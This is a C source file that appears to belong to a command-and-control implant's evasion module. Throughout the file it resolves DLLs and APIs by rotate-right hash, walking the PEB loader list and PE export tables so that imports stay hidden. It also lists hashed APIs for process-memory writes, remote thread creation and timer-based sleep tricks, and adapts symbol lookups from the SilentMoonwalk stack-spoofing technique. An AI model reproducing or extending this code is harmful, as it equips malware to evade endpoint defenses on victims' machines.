#include "../../../../headers/agent/evasion/Peparsing/evasive.h"
#include <stdio.h>



// Function to rotate the bits of a 64-bit unsigned integer to the right
UINT64 Rotr64(UINT64 value, UINT count) {
    const UINT mask = 8 * sizeof(value) - 1;
    count &= mask;
#pragma warning( push )
#pragma warning( disable : 4146)
    return (value >> count) | (value << ((-count) & mask));
#pragma warning( pop ) 

}

// Simple Rotr64 hash function for strings
UINT64 Rotr64HashA(const LPSTR str) {
    UINT64 hash = 0;
    for (int i = 0; i < StringLengthA(str); i++) {
        // Combine the current character with the hash using XOR
		hash = str[i] + Rotr64(hash, 7);
    }
    return hash;
}

UINT64 Rotr64HashW(const LPWSTR str) {
	UINT64 hash = 0;
	for (int i = 0; i < StringLengthW(str); i++) {
		// Combine the current character with the hash using XOR
		hash = str[i] + Rotr64(hash, 7);
	}
	return hash;
}
/*
****Hashing Order****

DllNameHashes = {
0xAF6973267322CEF1, //KERNEL32.DLL
0xD99176CD993A6E6C, //ntdll.dll
}
ApiNameHashes = {
0x27C27F0E9D246F42, //WinHttpOpen
0xEB0E11CDF0F8755D, //WinHttpConnect
0x271EFDAEEC211456, //WinHttpOpenRequest
0x371EFDAEEC1C1D40, //WinHttpSendRequest
0xB34C34E468B2D450, //WinHttpSetOption
0x61B35AE1647C5613, //WinHttpAddRequestHeaders
0x5849BC331DE4F77, //WinHttpReceiveResponse
0xBC2634B9D6ABC69B, //WinHttpQueryHeaders
0xBBCD1381F969714B, //WinHttpReadData
0xE91AC4AB50E39E3E, //WinHttpCloseHandle
0x934CBF2CB5BA65FE, //RtlGetVersion
0xE7BF643E93800065, //NtClose
0x96366A0AA4E7804E, //NtOpenProcessToken
0x1F25DB6092C0F340, //NtOpenThreadToken
0x30650DA980EEDACA, //NtQueryInformationToken
0x75A514F31871F04A, //RtlAllocateHeap
0x75A4A0B9D2C3F04A, //RtlReAllocateHeap
0xD3B77E4DD8696D61, //RtlRandomEx
0x7416C5FD78F4D55E, //NtGetTickCount
0x5FC99BF0197A7133, //GetAdaptersInfo
0x61EF0CEE5979D62B, //GetUserNameA
0xC89E0CCD2E1EF42B, //GetComputerNameExA
0xDFB3641D9871EFFB, //LocalAlloc
0x9E13641CB4B6622B, //LocalReAlloc
0xCBCA36CC38F7CC65, //LocalFree
0xB22B0F2C5A666505, //LoadLibraryA
0x2B3DEF2C9071F059, //GetProcAddress
0x71DEA6CC38F7CD4F, //GetLocalTime
0x1261F2B90D585BD0, //GetSystemTimeAsFileTime
0x9774D5E616F6E65D, //GetSystemMetrics
}
*/

LPVOID RetrieveModuleHandleFromHash(UINT64 hash) {
    P_INT_LDR_DATA_TABLE_ENTRY pModule = (P_INT_LDR_DATA_TABLE_ENTRY)((P_INT_PEB)agent->pTeb->ProcessEnvironmentBlock)->Ldr->InMemoryOrderLinks.Flink;
    P_INT_LDR_DATA_TABLE_ENTRY pFirstModule = pModule;

    do
    {
		UINT64 moduleNameHash = Rotr64HashW(pModule->BaseDllName.Buffer);
		if (moduleNameHash == hash) {
			return pModule->DllBase;
		}
		pModule = (P_INT_LDR_DATA_TABLE_ENTRY)pModule->InLoadOrderLinks.Flink;

	} while (pModule && pModule != pFirstModule);

    return INVALID_HANDLE_VALUE;
}

LPVOID RetrieveFunctionPointerFromhash(HMODULE Module, UINT64 Hash) {
	PIMAGE_NT_HEADERS pNtHeaders = NULL;
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;
    DWORD ExportDirectorySize = 0;
	PDWORD pAddressOfFunctions = NULL;
	PDWORD pAddressOfNames = NULL;
	PWORD pAddressOfNameOrdinals = NULL;
    LPSTR FunctionName = NULL;
    NTSTATUS Success = 0;


    pNtHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)Module + ((PIMAGE_DOS_HEADER)Module)->e_lfanew);
	pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)Module + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    ExportDirectorySize = (DWORD)((LPBYTE)Module + pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size);

	pAddressOfFunctions = (PDWORD)((LPBYTE)Module + pExportDirectory->AddressOfFunctions);
	pAddressOfNames = (PDWORD)((LPBYTE)Module + pExportDirectory->AddressOfNames);
	pAddressOfNameOrdinals = (PWORD)((LPBYTE)Module + pExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {

        FunctionName = (LPSTR)((LPBYTE)Module + pAddressOfNames[i]);
        //TODO remove debug statements
    	//printf("FunctionName: %s\n", (LPSTR)((LPBYTE)Module + pAddressOfNames[i]));
		UINT64 functionNameHash = Rotr64HashA(FunctionName); // there could be issues here because i used WSTR to generate hashes. Here we're using ASTR
    	//printf("FunctionNameHash: 0x%llX\n", functionNameHash);
        if (functionNameHash == Hash) {

            DWORD funcRVA = pAddressOfFunctions[pAddressOfNameOrdinals[i]];
			LPVOID FunctionAddr = (LPVOID)((LPBYTE)Module + funcRVA);

            if ((ULONG_PTR)FunctionAddr >= (ULONG_PTR)pExportDirectory && (ULONG_PTR)FunctionAddr < (ULONG_PTR)pExportDirectory + ExportDirectorySize) { // we've received a forwarded address.

                USTRING ForwardedFunction;
                ForwardedFunction.Length = StringLengthA(FunctionName);
                ForwardedFunction.MaximumLength = ForwardedFunction.Length + sizeof(CHAR);
                ForwardedFunction.Buffer = FunctionName;

                if ((Success = (agent->apis->pLdrGetProcedureAddress(Module, &ForwardedFunction, 0, &FunctionAddr))) != 0)
                {
                    return NULL; 
                }
                
            }

            return FunctionAddr;
		}
	}
	return NULL;
}

PVOID GetModuleBaseAddr(_In_ UINT64 Hash)
{
    P_INT_LDR_DATA_TABLE_ENTRY Ldr = NULL;
    PLIST_ENTRY Hdr = NULL;
    PLIST_ENTRY Ent = NULL;
    P_INT_PEB Peb = NULL;

    Peb = agent->pTeb->ProcessEnvironmentBlock;
    Hdr = &Peb->Ldr->InMemoryOrderLinks;
    Ent = Hdr->Flink;

    // cycle through the doubly linked list until we reach the first link.
    for (; Hdr != Ent; Ent = Ent->Flink)
    {
        Ldr = Ent;

        if ((Rotr64HashW(Ldr->BaseDllName.Buffer) == Hash) || Hash == 0)
            return Ldr->DllBase;

    }

    return NULL;

}

DWORD GetImageSize(_In_ PVOID ModuleBase)
{
	PIMAGE_DOS_HEADER DosHdr = NULL;
	PIMAGE_NT_HEADERS NtHdr = NULL;

	DosHdr = (PIMAGE_DOS_HEADER)ModuleBase;
	NtHdr = (PIMAGE_NT_HEADERS)((LPBYTE)ModuleBase + DosHdr->e_lfanew);

	return NtHdr->OptionalHeader.SizeOfImage;
    
}

WORD GetNumberOfSections(_In_ PVOID ModuleBase)
{
    IMAGE_DOS_HEADER* dosHeader = (IMAGE_DOS_HEADER*)ModuleBase;
    IMAGE_NT_HEADERS* NtHeaders = (IMAGE_NT_HEADERS*)((BYTE*)ModuleBase + dosHeader->e_lfanew);

    return NtHeaders->FileHeader.NumberOfSections;
}

//TODO finish the putting the hashes into the agent using the config builder. maybe even put it in a custom section?
//TODO add 32bit hash support.
void printhashes() {

    UINT64 hash = 0;

    LPWSTR DllNames[] = {
		L"KERNEL32.DLL",
		L"ntdll.dll",
		L"user32.dll",
		L"advapi32.dll",
		L"winhttp.dll",
		L"iphlpapi.dll"
	};
	printf("DllNameHashes = {\n");
	for (int i = 0; i < sizeof(DllNames) / sizeof(DllNames[0]); i++) {
		hash = Rotr64HashW(DllNames[i]);
		printf("0x%llX, //%ls\n", hash, DllNames[i]);
	}
    printf("}\n");
    LPSTR apiNames[] = {
        "WinHttpOpen",
        "WinHttpConnect",
        "WinHttpOpenRequest",
        "WinHttpSendRequest",
        "WinHttpSetOption",
        "WinHttpAddRequestHeaders",
        "WinHttpReceiveResponse",
        "WinHttpQueryHeaders",
        "WinHttpReadData",
        "WinHttpCloseHandle",
        "RtlGetVersion",
        "ZwClose",
        "ZwOpenProcessToken",
        "ZwOpenThreadToken",
        "ZwQueryInformationToken",
        "RtlAllocateHeap",
        "RtlReAllocateHeap",
        "RtlRandomEx",
        "NtGetTickCount", //** THERE IS NO ZW ALTERNATIVE **
        "GetAdaptersInfo",
        "GetUserNameA",
        "GetComputerNameExA",
        "LocalAlloc",
        "LocalReAlloc",
        "LocalFree",
        "LoadLibraryA",
        "GetProcAddress",
        "GetLocalTime",
        "GetSystemTimeAsFileTime",
        "GetSystemMetrics",
        "RtlCreateTimerQueue",
        "ZwCreateEvent",
        "RtlCaptureContext",
        "RtlCreateTimer",
        "RtlRegisterWait",
        "RtlDeleteTimerQueue",
        "RtlCopyMappedMemory",
        "ZwWaitForSingleObject",
        "ZwSignalAndWaitForSingleObject",
        "ZwContinue",
        "ZwSetEvent",
        "ZwSetContextThread",
        "ZwDuplicateObject",
        "VirtualProtect",
        "SystemFunction032",
        "WaitForSingleObjectEx",
        "LdrGetProcedureAddress",
        "ZwQueryVirtualMemory",
    	"BaseThreadInitThunk",
    	"RtlUserThreadStart",
    	"ZwOpenThread",
    	"ZwAllocateVirtualMemory",
    	"ZwProtectVirtualMemory",
    	"ZwCreateThreadEx",
    	"ZwSetInformationVirtualMemory",
    	"ZwQueryInformationProcess",
    	"ZwOpenProcess",
    	"ZwReadVirtualMemory",
    	"ZwWriteVirtualMemory",
    	"ZwCreateUserProcess",
    	"RtlCreateProcessParametersEx",
    };
	printf("ApiNameHashes = {\n");
	for (int i = 0; i < sizeof(apiNames) / sizeof(apiNames[0]); i++) {
		hash = Rotr64HashA(apiNames[i]);
        printf("0x%llX, //%s %d\n", hash, apiNames[i], i);
	}
	printf("}\n");
}

PVOID GetExceptionDirectoryAddress(HMODULE hModule, DWORD* tSize)
{
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD64)hModule + dosHeader->e_lfanew);
	DWORD64 exceptionDirectoryRVA = ntHeader->OptionalHeader.DataDirectory[3].VirtualAddress;
	*tSize = ntHeader->OptionalHeader.DataDirectory[3].Size;
	DWORD64 imageExceptionDirectory = (DWORD64)((DWORD_PTR)hModule + exceptionDirectoryRVA);
	return (PVOID)imageExceptionDirectory;

}

PVOID GetExportDirectoryAddress(HMODULE hModule)
{
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)hModule + dosHeader->e_lfanew);
	DWORD exportDirectoryRVA = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	PVOID imageExportDirectory = (ULONG_PTR)hModule + exportDirectoryRVA;

	return imageExportDirectory;
}

//modified function from SilentMoonwalk technique to retrieve the symbol from the export table of a given function.
UINT64 GetSymbolAddress(HMODULE hModule, UINT64 FuncHash) {
    UINT64 dllAddress = (UINT64)hModule,
        symbolAddress = 0,
        exportedAddressTable = 0,
        namePointerTable = 0,
        ordinalTable = 0;

    if (hModule == NULL) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = NULL;
    PIMAGE_DATA_DIRECTORY dataDirectory = NULL;
    PIMAGE_EXPORT_DIRECTORY exportDirectory = NULL;

    ntHeaders = (PIMAGE_NT_HEADERS)(dllAddress + ((PIMAGE_DOS_HEADER)dllAddress)->e_lfanew);
    dataDirectory = (PIMAGE_DATA_DIRECTORY)&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllAddress + dataDirectory->VirtualAddress);

    exportedAddressTable = (dllAddress + exportDirectory->AddressOfFunctions);
    namePointerTable = (dllAddress + exportDirectory->AddressOfNames);
    ordinalTable = (dllAddress + exportDirectory->AddressOfNameOrdinals);

	//only useful if we're passing an ordinal value to the function which we wont ever be doing.
	/*
    if (((UINT64)lpProcName & 0xFFFF0000) == 0x00000000) {
        exportedAddressTable += ((IMAGE_ORDINAL((UINT64)lpProcName) - exportDirectory->Base) * sizeof(DWORD));
        symbolAddress = (UINT64)(dllAddress + DEREF_32(exportedAddressTable));
    }
    */

        DWORD dwCounter = exportDirectory->NumberOfNames;
        while (dwCounter--) {
            char* cpExportedFunctionName = (char*)(dllAddress + DEREF_32(namePointerTable));
            if (Rotr64HashA(cpExportedFunctionName) == FuncHash) {
                exportedAddressTable += (DEREF_16(ordinalTable) * sizeof(DWORD));
                symbolAddress = (UINT64)(dllAddress + DEREF_32(exportedAddressTable));
                break;
            }
            namePointerTable += sizeof(DWORD);
            ordinalTable += sizeof(WORD);
        }


    return symbolAddress;
}

//modified version of GetSymbolOffset from SilentMoonWalk Technique that takes FuncHash instead of a string.
UINT64 GetSymbolOffset(HMODULE hModule, UINT64 FuncHash) {
    UINT64 dllAddress = (UINT64)hModule,
        symbolAddress = 0,
        exportedAddressTable = 0,
        namePointerTable = 0,
        ordinalTable = 0;

    if (hModule == NULL) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = NULL;
    PIMAGE_DATA_DIRECTORY dataDirectory = NULL;
    PIMAGE_EXPORT_DIRECTORY exportDirectory = NULL;

    ntHeaders = (PIMAGE_NT_HEADERS)(dllAddress + ((PIMAGE_DOS_HEADER)dllAddress)->e_lfanew);
    dataDirectory = (PIMAGE_DATA_DIRECTORY)&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllAddress + dataDirectory->VirtualAddress);

    exportedAddressTable = (dllAddress + exportDirectory->AddressOfFunctions);
    namePointerTable = (dllAddress + exportDirectory->AddressOfNames);
    ordinalTable = (dllAddress + exportDirectory->AddressOfNameOrdinals);


	//only useful if we're passing an ordinal value to the function which we wont ever be doing.
	/*
	if (((UINT64)lpProcName & 0xFFFF0000) == 0x00000000) {
		exportedAddressTable += ((IMAGE_ORDINAL((UINT64)lpProcName) - exportDirectory->Base) * sizeof(DWORD));
		symbolAddress = (UINT64)(dllAddress + DEREF_32(exportedAddressTable));
	}
	*/
    //else {
        DWORD dwCounter = exportDirectory->NumberOfNames;
        while (dwCounter--) {
            char* cpExportedFunctionName = (char*)(dllAddress + DEREF_32(namePointerTable));
            if (Rotr64HashA(cpExportedFunctionName) == FuncHash) {
                exportedAddressTable += (DEREF_16(ordinalTable) * sizeof(DWORD));
                symbolAddress = (UINT64)DEREF_32(exportedAddressTable);
                break;
            }
            namePointerTable += sizeof(DWORD);
            ordinalTable += sizeof(WORD);
        }
   // }

    return symbolAddress;
}

char* GetSymbolNameByOffset(HMODULE hModule, UINT64 offset) {
    UINT64 dllAddress = (UINT64)hModule,
        symbolAddress = 0;

    if (hModule == NULL) {
        return 0;
    }

    PIMAGE_NT_HEADERS ntHeaders = NULL;
    PIMAGE_DATA_DIRECTORY dataDirectory = NULL;
    PIMAGE_EXPORT_DIRECTORY exportDirectory = NULL;

    ntHeaders = (PIMAGE_NT_HEADERS)(dllAddress + ((PIMAGE_DOS_HEADER)dllAddress)->e_lfanew);
    dataDirectory = (PIMAGE_DATA_DIRECTORY)&ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dllAddress + dataDirectory->VirtualAddress);

    LPDWORD exportedAddressTable = (LPDWORD)(dllAddress + exportDirectory->AddressOfFunctions);
    LPDWORD namePointerTable = (LPDWORD)(dllAddress + exportDirectory->AddressOfNames);
    LPWORD ordinalTable = (LPWORD)(dllAddress + exportDirectory->AddressOfNameOrdinals);

    char* currProcName;

    for (SIZE_T i = 0; i < exportDirectory->NumberOfNames; i++) {
        // Get current function name
        currProcName = (LPSTR)((LPBYTE)hModule + namePointerTable[i]);

        // Get current function address
        if (exportedAddressTable[ordinalTable[i]] == offset) {
            return currProcName;
        }

    }

    return NULL;
}